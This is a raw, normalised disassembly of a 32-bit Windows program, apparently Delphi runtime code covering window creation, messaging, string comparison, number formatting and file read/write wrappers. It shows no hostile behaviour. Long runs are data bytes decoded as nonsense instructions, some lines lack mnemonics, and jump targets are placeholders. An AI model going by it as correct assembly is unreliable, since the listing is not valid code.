mov ah 0x47
add [ ebx - 0x1fda0040 ] cl
mov ah 0x47
add [ ebx - 0x23da0040 ] cl
mov ah 0x47
add [ ebx - 0x27da0040 ] cl
mov ah 0x47
add [ ebx - 0x2bda0040 ] cl
mov ah 0x47
add [ ebx - 0x2fda0040 ] cl
mov ah 0x47
add [ ebx - 0x33da0040 ] cl
mov ah 0x47
add [ ebx - 0x37da0040 ] cl
mov ah 0x47
add [ ebx - 0x3bda0040 ] cl
mov ah 0x47
add [ ebx - 0x3fda0040 ] cl
mov ah 0x47
add [ ebx - 0x43da0040 ] cl
mov ah 0x47
add [ ebx - 0x47da0040 ] cl
mov ah 0x47
add [ ebx - 0x4bda0040 ] cl
mov ah 0x47
add [ ebx - 0x4fda0040 ] cl
mov ah 0x47
add [ ebx - 0x53da0040 ] cl
mov ah 0x47
add [ ebx - 0x57da0040 ] cl
mov ah 0x47
add [ ebx - 0x5bda0040 ] cl
mov ah 0x47
add [ ebx - 0x5fda0040 ] cl
mov ah 0x47
add [ ebx - 0x63da0040 ] cl
mov ah 0x47
add [ ebx - 0x67da0040 ] cl
mov ah 0x47
add [ ebx - 0x6bda0040 ] cl
mov ah 0x47
add [ ebx - 0x6fda0040 ] cl
mov ah 0x47
add [ ebx - 0x73da0040 ] cl
mov ah 0x47
add [ ebx - 0x77da0040 ] cl
mov ah 0x47
add [ ebx - 0x7bda0040 ] cl
mov ah 0x47
add [ ebx - 0x7fda0040 ] cl
mov ah 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov ah 0x47
add [ ebx + 0x7825ffc0 ] cl
mov ah 0x47
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
inc edi
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x2425ffc0 ] cl
add [ ebx + 0x2c25ffc0 ] cl
mov bl 0x47
add [ ebx + 0x2825ffc0 ] cl
mov bl 0x47
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
or al 0x63
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x2025ffc0 ] cl
mov bl 0x47
add [ ebx + 0x1c25ffc0 ] cl
mov bl 0x47
mov eax eax
add ebx [ eax + 0x62 ]
inc eax
add [ ebx + 0x1c25ffc0 ] cl
mov dl 0x47
add [ ebx + 0x1825ffc0 ] cl
mov dl 0x47
add [ ebx + 0x1425ffc0 ] cl
mov dl 0x47
add [ ebx + 0x3025ffc0 ] cl
mov bl 0x47
sub_406d8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a0c
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_4029fc
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406de4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a0c
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_4029fc
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406e3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406f31
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406f59
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f60
retn
sub_406f6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406f91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f98
retn
sub_406fa4
push 0xf00047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh dh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh bl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh al
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh cl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ eax + 0x680000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x680000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x680000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x680000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x59980000 ] dh
inc edi
add [ ebp + 0x680000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x680000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x680000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x680000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x680000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x680000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x680000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x59980000 ] bh
inc edi
add [ ebp + 0x680000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x680000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x680000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x680000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x680000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x680000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x680000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x59980000 ] ah
inc edi
add [ ebp + 0x680000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x680000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x680000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x680000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x680000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x680000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x680000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x59980000 ] ch
inc edi
add [ ebp + 0x680000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x680000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x680000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x680000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x550000ff ] dl
mov ebp esp
xor eax eax
push ebp
push sub_4072d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4072e0
retn
sub_407dd8
mov ecx 0xc300407d
jge r-xdata
add [ eax ] al
add [ eax ] al
add ch cl
jge r-xdata
pop ebx
cmp eax [ eax ]
add al ch
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x5effbf83 ] bl
jge r-xdata
call sub_40ba30
call sub_4039d8
pop edi
pop esi
pop ebx
retn
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x4effbf83 ] ch
jge r-xdata
insb
jne r-xdata
add [ eax + 0x7e ] ah
inc eax
add [ eax ] dh
add [ eax ] al
add [ edx + edx + 0x40 ] dl
add [ esp + esi + 0x5a4c0040 ] dl
inc eax
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
mov eax ebx
call sub_4027b4
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407dd83f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
jle r-xdata
mov edx ebx
call sub_402c58
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] al
xor al [ eax ]
aam 0xd1
inc eax
add [ esp + edx * 2 ] ah
add ah dh
jge r-xdata
dec ebp
jne r-xdata
add ah dl
rol [ eax ] 0x1
and al 0x54
add [ eax ] al
add [ eax ] al
sub_407e88
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407ebc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
pop edi
pop esi
pop ebx
retn
sub_407ee0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4027b4
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c58
mov eax esi
pop esi
pop ebx
retn
sub_407f00
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4027d4
call ebx
pop ebx
retn
sub_407f2c
push ebx
mov ebx eax
mov eax 0xc
call sub_4027b4
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407f00
pop ebx
retn
sub_407f64
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40425c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045e8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407fa0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40425c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045e8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407fdc
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_40800c
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_40802c
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_408080
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_40802c
test eax eax
jne r-xdata
sub_4080a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40425c
mov ebx eax
mov eax esi
call sub_40445c
mov edx eax
mov eax edi
mov ecx ebx
call sub_40408c
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_4080d8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40425c
mov ebx eax
mov eax esi
call sub_40445c
mov edx eax
mov eax edi
mov ecx ebx
call sub_40408c
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_40810c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40425c
push eax
mov eax esi
call sub_40445c
push eax
mov eax ebx
call sub_40425c
push eax
mov eax ebx
call sub_40445c
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408144
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40425c
push eax
mov eax esi
call sub_40445c
push eax
mov eax ebx
call sub_40425c
push eax
mov eax ebx
call sub_40445c
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408194
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_4081b4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_40425c
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403f9c
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4044bc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_408204
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_40425c
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_40425c
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408268
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_40827e
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_40827e
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40827e
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4082b4
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_408268
mov edx esi
pop eax
call sub_40408c
add esp 0x10
pop esi
retn
sub_4082d4
or cl cl
jne sub_408308
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_408308
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_408308
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_408308
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4083a0
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_4082d4
mov edx esi
pop eax
call sub_40408c
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_4083c8
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_408268
mov edx esi
pop eax
call sub_40408c
add esp 0x20
pop esi
retn
xor edx edx
sub_4083f0
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c78
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407ebc
sub_408444
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c78
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408464
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404e14
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408484
mov eax [ rw-data ]
call sub_405044
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_405044
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405200
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ff0
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405200
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ff0
sub_408514
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_40817c
test al al
je r-xdata
sub_408550
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409794
mov edx eax
test dl dl
je r-xdata
call sub_408484
push ebp
mov eax [ rw-data ]
call sub_40504c
mov edx eax
mov eax [ rw-data ]
call sub_408514
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_40504c
mov edx eax
mov eax [ rw-data ]
call sub_408514
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4085ec
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403ff0
call sub_408484
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ff0
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ff0
jmp r-xdata
pop esi
pop ebx
retn
sub_408638
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_40445c
push eax
call CreateFileA
sub_408690
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_40445c
push eax
call CreateFileA
pop ebx
retn
sub_4086bc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4086e8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408714
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
